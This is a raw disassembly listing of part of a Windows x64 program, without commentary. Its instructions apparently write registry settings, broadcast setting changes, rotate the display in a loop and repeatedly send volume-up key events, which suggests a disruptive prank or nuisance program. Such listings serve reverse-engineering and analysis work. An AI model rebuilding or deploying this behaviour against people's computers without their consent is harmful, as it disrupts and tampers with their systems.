   140003478:	e8 13 2c 00 00       	call   0x140006090
   14000347d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003482:	ff 15 e0 4c 00 00    	call   *0x4ce0(%rip)        # 0x140008168
   140003488:	90                   	nop
   140003489:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000348e:	ff 15 b4 4c 00 00    	call   *0x4cb4(%rip)        # 0x140008148
   140003494:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140003498:	ff 15 d2 4c 00 00    	call   *0x4cd2(%rip)        # 0x140008170
   14000349e:	90                   	nop
   14000349f:	48 2b f3             	sub    %rbx,%rsi
   1400034a2:	48 81 fe 00 10 00 00 	cmp    $0x1000,%rsi
   1400034a9:	72 1c                	jb     0x1400034c7
   1400034ab:	48 83 c6 27          	add    $0x27,%rsi
   1400034af:	48 8b 43 f8          	mov    -0x8(%rbx),%rax
   1400034b3:	48 2b d8             	sub    %rax,%rbx
   1400034b6:	48 83 eb 08          	sub    $0x8,%rbx
   1400034ba:	48 83 fb 1f          	cmp    $0x1f,%rbx
   1400034be:	0f 87 2a 01 00 00    	ja     0x1400035ee
   1400034c4:	48 8b d8             	mov    %rax,%rbx
   1400034c7:	48 8b d6             	mov    %rsi,%rdx
   1400034ca:	48 8b cb             	mov    %rbx,%rcx
   1400034cd:	e8 8e 33 00 00       	call   0x140006860
   1400034d2:	48 8b 8d 80 01 00 00 	mov    0x180(%rbp),%rcx
   1400034d9:	48 33 cc             	xor    %rsp,%rcx
   1400034dc:	e8 5f 33 00 00       	call   0x140006840
   1400034e1:	4c 8d 9c 24 90 02 00 	lea    0x290(%rsp),%r11
   1400034e8:	00 
   1400034e9:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400034ed:	49 8b 73 28          	mov    0x28(%r11),%rsi
   1400034f1:	49 8b 7b 30          	mov    0x30(%r11),%rdi
   1400034f5:	4d 8b 63 38          	mov    0x38(%r11),%r12
   1400034f9:	49 8b e3             	mov    %r11,%rsp
   1400034fc:	41 5f                	pop    %r15
   1400034fe:	41 5e                	pop    %r14
   140003500:	5d                   	pop    %rbp
   140003501:	c3                   	ret
   140003502:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003507:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000350b:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003510:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140003515:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003519:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   14000351f:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003523:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   140003528:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   14000352d:	74 28                	je     0x140003557
   14000352f:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   140003533:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   140003538:	48 39 08             	cmp    %rcx,(%rax)
   14000353b:	75 1a                	jne    0x140003557
   14000353d:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   140003541:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140003545:	48 89 08             	mov    %rcx,(%rax)
   140003548:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   14000354c:	48 89 08             	mov    %rcx,(%rax)
   14000354f:	2b d1                	sub    %ecx,%edx
   140003551:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   140003555:	89 10                	mov    %edx,(%rax)
   140003557:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   14000355b:	74 0a                	je     0x140003567
   14000355d:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140003562:	e8 29 2b 00 00       	call   0x140006090
   140003567:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000356c:	ff 15 f6 4b 00 00    	call   *0x4bf6(%rip)        # 0x140008168
   140003572:	90                   	nop
   140003573:	e9 11 ff ff ff       	jmp    0x140003489
   140003578:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000357d:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140003581:	4c 89 7c 0c 50       	mov    %r15,0x50(%rsp,%rcx,1)
   140003586:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000358b:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000358f:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003595:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140003599:	4c 89 74 24 58       	mov    %r14,0x58(%rsp)
   14000359e:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   1400035a3:	74 28                	je     0x1400035cd
   1400035a5:	48 8d 4d c8          	lea    -0x38(%rbp),%rcx
   1400035a9:	48 8b 44 24 70       	mov    0x70(%rsp),%rax
   1400035ae:	48 39 08             	cmp    %rcx,(%rax)
   1400035b1:	75 1a                	jne    0x1400035cd
   1400035b3:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   1400035b7:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400035bb:	48 89 08             	mov    %rcx,(%rax)
   1400035be:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   1400035c2:	48 89 08             	mov    %rcx,(%rax)
   1400035c5:	2b d1                	sub    %ecx,%edx
   1400035c7:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
   1400035cb:	89 10                	mov    %edx,(%rax)
   1400035cd:	80 7d d4 00          	cmpb   $0x0,-0x2c(%rbp)
   1400035d1:	74 0a                	je     0x1400035dd
   1400035d3:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035d8:	e8 b3 2a 00 00       	call   0x140006090
   1400035dd:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   1400035e2:	ff 15 80 4b 00 00    	call   *0x4b80(%rip)        # 0x140008168
   1400035e8:	90                   	nop
   1400035e9:	e9 9b fe ff ff       	jmp    0x140003489
   1400035ee:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400035f5:	00 00 
   1400035f7:	45 33 c9             	xor    %r9d,%r9d
   1400035fa:	45 33 c0             	xor    %r8d,%r8d
   1400035fd:	33 d2                	xor    %edx,%edx
   1400035ff:	33 c9                	xor    %ecx,%ecx
   140003601:	ff 15 01 4f 00 00    	call   *0x4f01(%rip)        # 0x140008508
   140003607:	cc                   	int3
   140003608:	cc                   	int3
   140003609:	cc                   	int3
   14000360a:	cc                   	int3
   14000360b:	cc                   	int3
   14000360c:	cc                   	int3
   14000360d:	cc                   	int3
   14000360e:	cc                   	int3
   14000360f:	cc                   	int3
   140003610:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003615:	57                   	push   %rdi
   140003616:	48 83 ec 20          	sub    $0x20,%rsp
   14000361a:	48 8d b9 a8 00 00 00 	lea    0xa8(%rcx),%rdi
   140003621:	48 8b 01             	mov    (%rcx),%rax
   140003624:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140003628:	48 8d 05 e9 57 00 00 	lea    0x57e9(%rip),%rax        # 0x140008e18
   14000362f:	48 89 84 3a 58 ff ff 	mov    %rax,-0xa8(%rdx,%rdi,1)
   140003636:	ff 
   140003637:	48 8b 01             	mov    (%rcx),%rax
   14000363a:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000363e:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140003644:	89 94 39 54 ff ff ff 	mov    %edx,-0xac(%rcx,%rdi,1)
   14000364b:	48 8d 9f 60 ff ff ff 	lea    -0xa0(%rdi),%rbx
   140003652:	48 8d 05 3f 57 00 00 	lea    0x573f(%rip),%rax        # 0x140008d98
   140003659:	48 89 03             	mov    %rax,(%rbx)
   14000365c:	48 83 bb 80 00 00 00 	cmpq   $0x0,0x80(%rbx)
   140003663:	00 
   140003664:	74 2f                	je     0x140003695
   140003666:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   14000366a:	48 8d 43 70          	lea    0x70(%rbx),%rax
   14000366e:	48 39 01             	cmp    %rax,(%rcx)
   140003671:	75 22                	jne    0x140003695
   140003673:	4c 8b 83 90 00 00 00 	mov    0x90(%rbx),%r8
   14000367a:	48 8b 93 88 00 00 00 	mov    0x88(%rbx),%rdx
   140003681:	48 89 11             	mov    %rdx,(%rcx)
   140003684:	48 8b 43 38          	mov    0x38(%rbx),%rax
   140003688:	48 89 10             	mov    %rdx,(%rax)
   14000368b:	44 2b c2             	sub    %edx,%r8d
   14000368e:	48 8b 43 50          	mov    0x50(%rbx),%rax
   140003692:	44 89 00             	mov    %r8d,(%rax)
   140003695:	80 7b 7c 00          	cmpb   $0x0,0x7c(%rbx)
   140003699:	74 08                	je     0x1400036a3
   14000369b:	48 8b cb             	mov    %rbx,%rcx
   14000369e:	e8 ed 29 00 00       	call   0x140006090
   1400036a3:	48 8b cb             	mov    %rbx,%rcx
   1400036a6:	ff 15 bc 4a 00 00    	call   *0x4abc(%rip)        # 0x140008168
   1400036ac:	90                   	nop
   1400036ad:	48 8d 8f 68 ff ff ff 	lea    -0x98(%rdi),%rcx
   1400036b4:	ff 15 8e 4a 00 00    	call   *0x4a8e(%rip)        # 0x140008148
   1400036ba:	48 8b cf             	mov    %rdi,%rcx
   1400036bd:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400036c2:	48 83 c4 20          	add    $0x20,%rsp
   1400036c6:	5f                   	pop    %rdi
   1400036c7:	48 ff 25 a2 4a 00 00 	rex.W jmp *0x4aa2(%rip)        # 0x140008170
   1400036ce:	cc                   	int3
   1400036cf:	cc                   	int3
   1400036d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400036d5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400036da:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400036df:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400036e4:	41 56                	push   %r14
   1400036e6:	b8 20 14 00 00       	mov    $0x1420,%eax
   1400036eb:	e8 a0 36 00 00       	call   0x140006d90
   1400036f0:	48 2b e0             	sub    %rax,%rsp
   1400036f3:	48 8b 05 46 99 00 00 	mov    0x9946(%rip),%rax        # 0x14000d040
   1400036fa:	48 33 c4             	xor    %rsp,%rax
   1400036fd:	48 89 84 24 10 14 00 	mov    %rax,0x1410(%rsp)
   140003704:	00 
   140003705:	66 0f 6f 05 53 57 00 	movdqa 0x5753(%rip),%xmm0        # 0x140008e60
   14000370c:	00 
   14000370d:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140003713:	c7 44 24 60 c0 00 00 	movl   $0xc0,0x60(%rsp)
   14000371a:	00 
   14000371b:	ff 15 af 4a 00 00    	call   *0x4aaf(%rip)        # 0x1400081d0
   140003721:	c7 84 24 04 14 00 00 	movl   $0xffffffff,0x1404(%rsp)
   140003728:	ff ff ff ff 
   14000372c:	ba 01 00 00 00       	mov    $0x1,%edx
   140003731:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140003738:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000373f:	00 
   140003740:	8b c8                	mov    %eax,%ecx
   140003742:	c1 e9 1e             	shr    $0x1e,%ecx
   140003745:	33 c8                	xor    %eax,%ecx
   140003747:	69 c1 65 89 07 6c    	imul   $0x6c078965,%ecx,%eax
   14000374d:	03 c2                	add    %edx,%eax
   14000374f:	89 84 94 84 00 00 00 	mov    %eax,0x84(%rsp,%rdx,4)
   140003756:	48 ff c2             	inc    %rdx
   140003759:	48 81 fa 70 02 00 00 	cmp    $0x270,%rdx
   140003760:	72 de                	jb     0x140003740
   140003762:	c7 84 24 80 00 00 00 	movl   $0x270,0x80(%rsp)
   140003769:	70 02 00 00 
   14000376d:	33 ed                	xor    %ebp,%ebp
   14000376f:	41 be 00 00 00 80    	mov    $0x80000000,%r14d
   140003775:	48 bf ff a1 2f 4d ff 	movabs $0x7fffffff4d2fa1ff,%rdi
   14000377c:	ff ff 7f 
   14000377f:	be 00 5e d0 b2       	mov    $0xb2d05e00,%esi
   140003784:	48 bb ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rbx
   14000378b:	ff ff 7f 
   14000378e:	66 90                	xchg   %ax,%ax
   140003790:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   140003797:	00 
   140003798:	e8 13 2d 00 00       	call   0x1400064b0
   14000379d:	8b c8                	mov    %eax,%ecx
   14000379f:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037a3:	85 c0                	test   %eax,%eax
   1400037a5:	75 21                	jne    0x1400037c8
   1400037a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400037ae:	00 00 
   1400037b0:	48 8d 8c 24 80 00 00 	lea    0x80(%rsp),%rcx
   1400037b7:	00 
   1400037b8:	e8 f3 2c 00 00       	call   0x1400064b0
   1400037bd:	8b c8                	mov    %eax,%ecx
   1400037bf:	48 8d 04 89          	lea    (%rcx,%rcx,4),%rax
   1400037c3:	83 f8 01             	cmp    $0x1,%eax
   1400037c6:	72 e8                	jb     0x1400037b0
   1400037c8:	48 c1 e8 20          	shr    $0x20,%rax
   1400037cc:	48 8d 15 8d 54 00 00 	lea    0x548d(%rip),%rdx        # 0x140008c60
   1400037d3:	49 2b c6             	sub    %r14,%rax
   1400037d6:	41 b9 02 00 00 00    	mov    $0x2,%r9d
   1400037dc:	48 35 00 00 00 80    	xor    $0xffffffff80000000,%rax
   1400037e2:	45 33 c0             	xor    %r8d,%r8d
   1400037e5:	8b 4c 84 50          	mov    0x50(%rsp,%rax,4),%ecx
   1400037e9:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   1400037ee:	89 4c 24 70          	mov    %ecx,0x70(%rsp)
   1400037f2:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   1400037f9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400037fe:	ff 15 04 48 00 00    	call   *0x4804(%rip)        # 0x140008008
   140003804:	85 c0                	test   %eax,%eax
   140003806:	75 67                	jne    0x14000386f
   140003808:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000380d:	48 8d 44 24 70       	lea    0x70(%rsp),%rax
   140003812:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003819:	00 
   14000381a:	48 8d 15 6f 54 00 00 	lea    0x546f(%rip),%rdx        # 0x140008c90
   140003821:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003827:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000382c:	45 33 c0             	xor    %r8d,%r8d
   14000382f:	ff 15 db 47 00 00    	call   *0x47db(%rip)        # 0x140008010
   140003835:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   14000383a:	ff 15 c0 47 00 00    	call   *0x47c0(%rip)        # 0x140008000
   140003840:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   140003845:	4c 8d 0d 5c 54 00 00 	lea    0x545c(%rip),%r9        # 0x140008ca8
   14000384c:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003853:	00 
   140003854:	45 33 c0             	xor    %r8d,%r8d
   140003857:	ba 1a 00 00 00       	mov    $0x1a,%edx
   14000385c:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003863:	00 
   140003864:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003869:	ff 15 71 4a 00 00    	call   *0x4a71(%rip)        # 0x1400082e0
   14000386f:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140003874:	e8 a7 d7 ff ff       	call   0x140001020
   140003879:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   14000387e:	48 3b c7             	cmp    %rdi,%rax
   140003881:	7d 18                	jge    0x14000389b
   140003883:	48 8d 0c 30          	lea    (%rax,%rsi,1),%rcx
   140003887:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   14000388c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003891:	e8 6a 24 00 00       	call   0x140005d00
   140003896:	e9 f5 fe ff ff       	jmp    0x140003790
   14000389b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400038a0:	48 89 5c 24 40       	mov    %rbx,0x40(%rsp)
   1400038a5:	e8 56 24 00 00       	call   0x140005d00
   1400038aa:	e9 e1 fe ff ff       	jmp    0x140003790
   1400038af:	cc                   	int3
   1400038b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400038b5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400038ba:	57                   	push   %rdi
   1400038bb:	48 81 ec 30 01 00 00 	sub    $0x130,%rsp
   1400038c2:	48 8b 05 77 97 00 00 	mov    0x9777(%rip),%rax        # 0x14000d040
   1400038c9:	48 33 c4             	xor    %rsp,%rax
   1400038cc:	48 89 84 24 20 01 00 	mov    %rax,0x120(%rsp)
   1400038d3:	00 
   1400038d4:	bb dc 00 00 00       	mov    $0xdc,%ebx
   1400038d9:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400038de:	44 8b c3             	mov    %ebx,%r8d
   1400038e1:	33 d2                	xor    %edx,%edx
   1400038e3:	e8 ea 3d 00 00       	call   0x1400076d2
   1400038e8:	66 0f 6f 05 50 55 00 	movdqa 0x5550(%rip),%xmm0        # 0x140008e40
   1400038ef:	00 
   1400038f0:	48 be ff 9a 32 e2 ff 	movabs $0x7fffffffe2329aff,%rsi
   1400038f7:	ff ff 7f 
   1400038fa:	66 89 9c 24 84 00 00 	mov    %bx,0x84(%rsp)
   140003901:	00 
   140003902:	48 bf ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rdi
   140003909:	ff ff 7f 
   14000390c:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   140003912:	33 db                	xor    %ebx,%ebx
   140003914:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140003919:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   14000391e:	33 c9                	xor    %ecx,%ecx
   140003920:	ff 15 da 49 00 00    	call   *0x49da(%rip)        # 0x140008300
   140003926:	85 c0                	test   %eax,%eax
   140003928:	74 44                	je     0x14000396e
   14000392a:	48 63 c3             	movslq %ebx,%rax
   14000392d:	8b 4c 84 30          	mov    0x30(%rsp,%rax,4),%ecx
   140003931:	89 8c 24 94 00 00 00 	mov    %ecx,0x94(%rsp)
   140003938:	83 f9 01             	cmp    $0x1,%ecx
   14000393b:	74 05                	je     0x140003942
   14000393d:	83 f9 03             	cmp    $0x3,%ecx
   140003940:	75 1c                	jne    0x14000395e
   140003942:	8b 8c 24 f0 00 00 00 	mov    0xf0(%rsp),%ecx
   140003949:	8b 84 24 ec 00 00 00 	mov    0xec(%rsp),%eax
   140003950:	89 84 24 f0 00 00 00 	mov    %eax,0xf0(%rsp)
   140003957:	89 8c 24 ec 00 00 00 	mov    %ecx,0xec(%rsp)
   14000395e:	ba 01 00 00 00       	mov    $0x1,%edx
   140003963:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003968:	ff 15 c2 49 00 00    	call   *0x49c2(%rip)        # 0x140008330
   14000396e:	ff c3                	inc    %ebx
   140003970:	81 e3 03 00 00 80    	and    $0x80000003,%ebx
   140003976:	7d 07                	jge    0x14000397f
   140003978:	ff cb                	dec    %ebx
   14000397a:	83 cb fc             	or     $0xfffffffc,%ebx
   14000397d:	ff c3                	inc    %ebx
   14000397f:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140003984:	e8 97 d6 ff ff       	call   0x140001020
   140003989:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   14000398e:	48 3b c6             	cmp    %rsi,%rax
   140003991:	7d 1a                	jge    0x1400039ad
   140003993:	48 05 00 65 cd 1d    	add    $0x1dcd6500,%rax
   140003999:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000399e:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400039a3:	e8 58 23 00 00       	call   0x140005d00
   1400039a8:	e9 67 ff ff ff       	jmp    0x140003914
   1400039ad:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400039b2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400039b7:	e8 44 23 00 00       	call   0x140005d00
   1400039bc:	e9 53 ff ff ff       	jmp    0x140003914
   1400039c1:	cc                   	int3
   1400039c2:	cc                   	int3
   1400039c3:	cc                   	int3
   1400039c4:	cc                   	int3
   1400039c5:	cc                   	int3
   1400039c6:	cc                   	int3
   1400039c7:	cc                   	int3
   1400039c8:	cc                   	int3
   1400039c9:	cc                   	int3
   1400039ca:	cc                   	int3
   1400039cb:	cc                   	int3
   1400039cc:	cc                   	int3
   1400039cd:	cc                   	int3
   1400039ce:	cc                   	int3
   1400039cf:	cc                   	int3
   1400039d0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400039d5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400039da:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400039df:	55                   	push   %rbp
   1400039e0:	41 56                	push   %r14
   1400039e2:	41 57                	push   %r15
   1400039e4:	48 8d ac 24 00 f6 ff 	lea    -0xa00(%rsp),%rbp
   1400039eb:	ff 
   1400039ec:	48 81 ec 00 0b 00 00 	sub    $0xb00,%rsp
   1400039f3:	48 8b 05 46 96 00 00 	mov    0x9646(%rip),%rax        # 0x14000d040
   1400039fa:	48 33 c4             	xor    %rsp,%rax
   1400039fd:	48 89 85 f0 09 00 00 	mov    %rax,0x9f0(%rbp)
   140003a04:	48 8b d9             	mov    %rcx,%rbx
   140003a07:	33 c9                	xor    %ecx,%ecx
   140003a09:	ff 15 99 4b 00 00    	call   *0x4b99(%rip)        # 0x1400085a8
   140003a0f:	8b c8                	mov    %eax,%ecx
   140003a11:	ff 15 a1 4b 00 00    	call   *0x4ba1(%rip)        # 0x1400085b8
   140003a17:	8b 05 5b 53 00 00    	mov    0x535b(%rip),%eax        # 0x140008d78
   140003a1d:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   140003a21:	89 85 a0 01 00 00    	mov    %eax,0x1a0(%rbp)
   140003a27:	33 f6                	xor    %esi,%esi
   140003a29:	0f b7 05 4c 53 00 00 	movzwl 0x534c(%rip),%eax        # 0x140008d7c
   140003a30:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003a33:	66 89 85 a4 01 00 00 	mov    %ax,0x1a4(%rbp)
   140003a3a:	0f 57 c9             	xorps  %xmm1,%xmm1
   140003a3d:	48 8d 05 fc e3 ff ff 	lea    -0x1c04(%rip),%rax        # 0x140001e40
   140003a44:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
   140003a48:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
   140003a4c:	48 8d 85 a0 01 00 00 	lea    0x1a0(%rbp),%rax
   140003a53:	48 89 45 20          	mov    %rax,0x20(%rbp)
   140003a57:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
   140003a5b:	66 0f 7f 45 00       	movdqa %xmm0,0x0(%rbp)
   140003a60:	66 0f 7f 4d 10       	movdqa %xmm1,0x10(%rbp)
   140003a65:	48 89 5d f8          	mov    %rbx,-0x8(%rbp)
   140003a69:	ff 15 19 49 00 00    	call   *0x4919(%rip)        # 0x140008388
   140003a6f:	48 89 74 24 58       	mov    %rsi,0x58(%rsp)
   140003a74:	4c 8d 05 05 53 00 00 	lea    0x5305(%rip),%r8        # 0x140008d80
   140003a7b:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140003a80:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   140003a87:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140003a8c:	45 33 c9             	xor    %r9d,%r9d
   140003a8f:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003a94:	33 c9                	xor    %ecx,%ecx
   140003a96:	c7 44 24 38 00 00 00 	movl   $0x80000000,0x38(%rsp)
   140003a9d:	80 
   140003a9e:	c7 44 24 30 00 00 00 	movl   $0x80000000,0x30(%rsp)
   140003aa5:	80 
   140003aa6:	c7 44 24 28 00 00 00 	movl   $0x80000000,0x28(%rsp)
   140003aad:	80 
   140003aae:	c7 44 24 20 00 00 00 	movl   $0x80000000,0x20(%rsp)
   140003ab5:	80 
   140003ab6:	ff 15 64 48 00 00    	call   *0x4864(%rip)        # 0x140008320
   140003abc:	41 b9 1b 00 00 00    	mov    $0x1b,%r9d
   140003ac2:	45 33 c0             	xor    %r8d,%r8d
   140003ac5:	48 8b c8             	mov    %rax,%rcx
   140003ac8:	ba 01 00 00 00       	mov    $0x1,%edx
   140003acd:	48 8b f8             	mov    %rax,%rdi
   140003ad0:	ff 15 aa 48 00 00    	call   *0x48aa(%rip)        # 0x140008380
   140003ad6:	bb 32 00 00 00       	mov    $0x32,%ebx
   140003adb:	49 bf 7f 0f 05 fd ff 	movabs $0x7ffffffffd050f7f,%r15
   140003ae2:	ff ff 7f 
   140003ae5:	49 be ff ff ff ff ff 	movabs $0x7fffffffffffffff,%r14
   140003aec:	ff ff 7f 
   140003aef:	90                   	nop
   140003af0:	45 33 c9             	xor    %r9d,%r9d
   140003af3:	45 33 c0             	xor    %r8d,%r8d
   140003af6:	33 d2                	xor    %edx,%edx
   140003af8:	b1 af                	mov    $0xaf,%cl
   140003afa:	ff 15 18 48 00 00    	call   *0x4818(%rip)        # 0x140008318
   140003b00:	45 33 c9             	xor    %r9d,%r9d
   140003b03:	33 d2                	xor    %edx,%edx
   140003b05:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   140003b0b:	b1 af                	mov    $0xaf,%cl
   140003b0d:	ff 15 05 48 00 00    	call   *0x4805(%rip)        # 0x140008318
   140003b13:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140003b18:	e8 03 d5 ff ff       	call   0x140001020
   140003b1d:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140003b22:	49 3b c7             	cmp    %r15,%rax
   140003b25:	7d 0c                	jge    0x140003b33
   140003b27:	48 05 80 f0 fa 02    	add    $0x2faf080,%rax
   140003b2d:	48 89 45 30          	mov    %rax,0x30(%rbp)
   140003b31:	eb 04                	jmp    0x140003b37
   140003b33:	4c 89 75 30          	mov    %r14,0x30(%rbp)
   140003b37:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140003b3b:	e8 c0 21 00 00       	call   0x140005d00
   140003b40:	48 83 eb 01          	sub    $0x1,%rbx
   140003b44:	75 aa                	jne    0x140003af0
   140003b46:	48 89 74 24 40       	mov    %rsi,0x40(%rsp)
   140003b4b:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   140003b50:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003b55:	48 8d 15 74 51 00 00 	lea    0x5174(%rip),%rdx        # 0x140008cd0
   140003b5c:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003b61:	45 33 c9             	xor    %r9d,%r9d
   140003b64:	c7 44 24 28 02 00 00 	movl   $0x2,0x28(%rsp)
   140003b6b:	00 
   140003b6c:	45 33 c0             	xor    %r8d,%r8d
   140003b6f:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   140003b76:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140003b7a:	c7 45 30 01 00 00 00 	movl   $0x1,0x30(%rbp)
   140003b81:	ff 15 91 44 00 00    	call   *0x4491(%rip)        # 0x140008018
   140003b87:	85 c0                	test   %eax,%eax
   140003b89:	75 66                	jne    0x140003bf1
   140003b8b:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003b90:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140003b94:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003b9b:	00 
   140003b9c:	48 8d 15 a5 51 00 00 	lea    0x51a5(%rip),%rdx        # 0x140008d48
   140003ba3:	41 b9 04 00 00 00    	mov    $0x4,%r9d
   140003ba9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003bae:	45 33 c0             	xor    %r8d,%r8d
   140003bb1:	ff 15 59 44 00 00    	call   *0x4459(%rip)        # 0x140008010
   140003bb7:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003bbc:	ff 15 3e 44 00 00    	call   *0x443e(%rip)        # 0x140008000
   140003bc2:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140003bc7:	4c 8d 0d 9a 51 00 00 	lea    0x519a(%rip),%r9        # 0x140008d68
   140003bce:	c7 44 24 28 64 00 00 	movl   $0x64,0x28(%rsp)
   140003bd5:	00 
   140003bd6:	45 33 c0             	xor    %r8d,%r8d
   140003bd9:	ba 1a 00 00 00       	mov    $0x1a,%edx
   140003bde:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   140003be5:	00 
   140003be6:	b9 ff ff 00 00       	mov    $0xffff,%ecx
   140003beb:	ff 15 ef 46 00 00    	call   *0x46ef(%rip)        # 0x1400082e0
   140003bf1:	ba 04 01 00 00       	mov    $0x104,%edx
   140003bf6:	48 8d 8d d0 05 00 00 	lea    0x5d0(%rbp),%rcx
   140003bfd:	ff 15 05 45 00 00    	call   *0x4505(%rip)        # 0x140008108
   140003c03:	85 c0                	test   %eax,%eax
   140003c05:	0f 84 0e 01 00 00    	je     0x140003d19
   140003c0b:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003c11:	48 8d 95 b0 01 00 00 	lea    0x1b0(%rbp),%rdx
   140003c18:	33 c9                	xor    %ecx,%ecx
